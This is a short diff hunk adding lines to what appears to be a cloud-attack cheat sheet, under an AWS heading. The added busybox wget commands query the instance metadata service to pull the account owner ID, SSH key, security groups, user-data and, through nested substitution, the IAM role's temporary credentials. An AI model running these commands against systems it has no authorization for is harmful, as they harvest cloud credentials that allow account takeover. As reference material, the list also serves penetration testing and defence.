@@ -147,6 +147,13 @@ AWS
 
 ```
 busybox wget -q -O - http://169.254.169.254/latest/meta-data/
+busybox wget -q -O - http://169.254.169.254/latest/meta-data/network/interfaces/macs/$(busybox wget -q -O - http://169.254.169.254/latest/meta-data/network/interfaces/macs/)/owner-id/
+busybox wget -q -O - http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+busybox wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/
+busybox wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/$(busybox wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+busybox wget -q -O - http://169.254.169.254/latest/dynamic/instance-identity/document/
+busybox wget -q -O - http://169.254.169.254/latest/meta-data/security-groups/
+busybox wget -q -O - http://169.254.169.254/latest/user-data
 ```
 
 Digital Ocean
